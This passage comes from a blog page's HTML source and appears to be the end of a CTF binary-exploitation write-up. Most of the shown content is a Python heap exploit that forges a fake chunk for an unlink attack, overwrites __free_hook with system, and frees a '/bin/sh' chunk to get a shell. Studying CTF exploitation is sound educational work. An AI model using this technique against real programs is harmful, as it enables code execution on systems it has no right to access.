</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x98</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x98</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=mh>0x90</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>note</span><span class=o>-</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>note</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x91</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x90</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\xa0</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>fake</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>free_hook</span><span class=p>,</span><span class=mh>0x98</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>æ›´æ–°äº 2019-12-14</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/>æ•´æ•°æº¢å‡º</a>,&nbsp;<a href=/tags/%E6%A0%88%E6%BC%8F%E6%B4%9E/>æ ˆæ¼æ´</a>,&nbsp;<a href=/tags/fsb/>fsb</a>,&nbsp;<a href=/tags/%E5%A0%86%E6%BC%8F%E6%B4%9E/>å †æ¼æ´</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>è¿”å›</a></span>&nbsp;|&nbsp;<span><a href=/>ä¸»é¡µ</a></span></section></div><div class=post-nav><a href=/qtable-ss-pagination/ class=prev rel=prev title="æœ¯ä¸šä¸“æ”»ï¼šQTable æœåŠ¡ç«¯åˆ†é¡µå®è·µ"><i class="fas fa-angle-left fa-fw"></i>æœ¯ä¸šä¸“æ”»ï¼šQTable æœåŠ¡ç«¯åˆ†é¡µå®è·µ</a>
<a href=/elgamal-ecc/ class=next rel=next title="ElGamal å¯†ç æ–¹æ¡ˆçš„æ¤­åœ†æ›²çº¿å½¢å¼å®ç°">ElGamal å¯†ç æ–¹æ¡ˆçš„æ¤­åœ†æ›²çº¿å½¢å¼å®ç°<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>ç”± <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.94.2">Hugo</a> å¼ºåŠ›é©±åŠ¨ | ä¸»é¢˜ - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2017 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Mercury</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=å›åˆ°é¡¶éƒ¨><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=æŸ¥çœ‹è¯„è®º><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/valine/Valine.min.js></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/auto-render.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"å¤åˆ¶åˆ°å‰ªè´´æ¿",maxShownLines:30},comment:{valine:{appId:"RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",appKey:"sw2sEPOl4haCAXKUFYiBFMrR",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:10,placeholder:"ä½ çš„è¯„è®º ...",recordIP:!1,visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"P149SBLX5U",algoliaIndex:"blog",algoliaSearchKey:"cbd5db1f3910ee11bc18688f21b64bd4",highlightTag:"em",maxResultLength:10,noResultsFound:"æ²¡æœ‰æ‰¾åˆ°ç»“æœ",snippetLength:50,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>